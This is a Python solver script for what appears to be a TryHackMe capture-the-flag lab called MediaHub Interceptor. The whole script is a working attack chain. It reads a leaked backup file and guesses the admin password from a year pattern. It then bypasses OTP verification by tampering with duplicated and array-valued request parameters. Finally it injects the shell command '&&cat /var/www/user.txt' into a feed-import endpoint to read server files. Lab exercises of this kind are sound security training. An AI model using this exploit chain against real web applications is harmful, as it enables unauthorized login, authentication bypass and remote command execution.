#!/usr/bin/env python3
"""TryHackMe MediaHub Interceptor challenge solver.

Flow:
1) Leak admin hint from login.php.bak.
2) Login via api_login.php.
3) Bypass OTP with request tampering.
4) Read admin flag from dashboard.
5) Trigger command injection in import_feed_api.php to read /var/www/user.txt.
"""

from __future__ import annotations

import argparse
import datetime as dt
import json
import re
import sys
from typing import Iterable

import requests

FLAG_RE = re.compile(r"THM\{[^}]+\}")
LOGIN_HINT_RE = re.compile(r"Email:\s*([^\s<]+)", re.IGNORECASE)


def build_url(base: str, path: str) -> str:
	return f"{base.rstrip('/')}/{path.lstrip('/')}"


def extract_first_flag(text: str) -> str | None:
	hit = FLAG_RE.search(text or "")
	return hit.group(0) if hit else None


def try_parse_json(text: str) -> dict | None:
	try:
		data = json.loads(text)
	except json.JSONDecodeError:
		return None
	return data if isinstance(data, dict) else None


def candidate_passwords(year: int) -> Iterable[str]:
	# The leaked note says: "MediaHub + any year".
	years = [year, year - 1, year + 1, year - 2, year + 2, year - 3, year + 3]
	seen = set()
	for y in years:
		if y in seen:
			continue
		seen.add(y)
		yield f"MediaHub{y}"


def fetch_admin_identity(session: requests.Session, base: str, timeout: int) -> tuple[str, list[str]]:
	admin_email = "admin@mediahub.thm"
	resp = session.get(build_url(base, "login.php.bak"), timeout=timeout)
	if resp.status_code != 200:
		current_year = dt.datetime.now().year
		return admin_email, list(candidate_passwords(current_year))

	maybe_email = LOGIN_HINT_RE.search(resp.text)
	if maybe_email:
		admin_email = maybe_email.group(1).strip()

	current_year = dt.datetime.now().year
	passwords = list(candidate_passwords(current_year))
	return admin_email, passwords


def login_admin(session: requests.Session, base: str, email: str, passwords: list[str], timeout: int) -> str:
	session.get(build_url(base, "login.php"), timeout=timeout)

	for password in passwords:
		resp = session.post(
			build_url(base, "api_login.php"),
			data={"email": email, "password": password},
			timeout=timeout,
		)
		data = try_parse_json(resp.text)
		if not data:
			continue
		if data.get("ok") is True and data.get("redirect") == "otp.php":
			return password

	raise RuntimeError("Admin login failed with leaked password pattern")


def bypass_otp(session: requests.Session, base: str, timeout: int) -> None:
	# Request tampering via duplicated/is-array verification field.
	payload = "otp=000000&is_verified=true&is_verified=1&is_verified[]="
	resp = session.post(
		build_url(base, "verify_otp.php"),
		data=payload,
		headers={"Content-Type": "application/x-www-form-urlencoded"},
		timeout=timeout,
	)
	data = try_parse_json(resp.text)
	if not data or data.get("ok") is not True:
		raise RuntimeError(f"OTP bypass failed: {resp.text}")


def fetch_admin_flag(session: requests.Session, base: str, timeout: int) -> str:
	resp = session.get(build_url(base, "dashboard.php"), timeout=timeout, allow_redirects=False)
	if resp.status_code != 200:
		raise RuntimeError(f"Dashboard not accessible, status={resp.status_code}")

	flag = extract_first_flag(resp.text)
	if not flag:
		raise RuntimeError("Admin flag not found on dashboard")
	return flag


def read_user_txt(session: requests.Session, base: str, timeout: int) -> str:
	# Frontend strips ;&| only in JS, backend remains injectable.
	payload = {"url": "http://x&&cat /var/www/user.txt"}
	resp = session.post(build_url(base, "import_feed_api.php"), data=payload, timeout=timeout)
	data = try_parse_json(resp.text)
	if not data:
		raise RuntimeError("import_feed_api.php did not return JSON")

	cmd_output = str(data.get("cmd_output", ""))
	flag = extract_first_flag(cmd_output) or extract_first_flag(resp.text)
	if not flag:
		raise RuntimeError(f"Could not parse /var/www/user.txt value: {resp.text}")
	return flag


def run(target: str, timeout: int) -> tuple[str, str]:
	with requests.Session() as session:
		email, passwords = fetch_admin_identity(session, target, timeout)
		used_password = login_admin(session, target, email, passwords, timeout)
		bypass_otp(session, target, timeout)

		admin_flag = fetch_admin_flag(session, target, timeout)
		user_txt_value = read_user_txt(session, target, timeout)

		print(f"[+] Admin email used : {email}")
		print(f"[+] Admin password   : {used_password}")
		print(f"[+] Admin flag       : {admin_flag}")
		print(f"[+] /var/www/user.txt: {user_txt_value}")

		return admin_flag, user_txt_value


def main() -> int:
	parser = argparse.ArgumentParser(description="Solve MediaHub interceptor challenge")
	parser.add_argument("--target", default="http://10.114.136.231", help="Target base URL")
	parser.add_argument("--timeout", type=int, default=10, help="HTTP timeout in seconds")
	args = parser.parse_args()

	try:
		run(args.target, args.timeout)
		return 0
	except Exception as exc:
		print(f"[-] Error: {exc}")
		return 1


if __name__ == "__main__":
	sys.exit(main())
